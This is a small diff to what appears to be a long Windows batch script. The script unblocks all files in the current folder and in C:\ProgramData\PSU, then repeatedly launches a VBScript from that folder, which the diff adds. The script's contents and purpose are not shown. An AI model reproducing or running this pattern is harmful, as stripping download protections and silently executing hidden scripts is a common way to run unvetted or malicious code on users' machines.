@@ -2064,4 +2064,8 @@ timeout 1 >> nul
 powershell.exe Unblock-File -Path "*"
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
 start "" "C:\ProgramData\PSU\start.vbs" >> nul
+timeout 3
+start "" "C:\ProgramData\PSU\start.vbs" >> nul
+timeout 3
+start "" "C:\ProgramData\PSU\start.vbs" >> nul
 exit >> nul
